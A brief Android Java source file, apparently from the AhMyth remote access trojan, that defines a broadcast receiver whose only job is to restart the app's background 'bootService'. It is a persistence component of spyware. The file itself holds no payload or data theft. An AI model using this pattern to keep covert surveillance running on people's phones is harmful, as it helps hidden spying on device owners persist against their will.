package ahmyth.mine.king.ahmyth;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;

public class restartReceiver extends BroadcastReceiver {


    @Override
    public void onReceive(Context context, Intent intent) {
        // TODO: This method is called when the BroadcastReceiver is receiving
        // an Intent broadcast.
        /*intent = new Intent( context, MainService.class );
        context.startService(intent);*/

        Intent i = new Intent(context, bootService.class);
        ComponentName service = context.startService(i);

    }
}
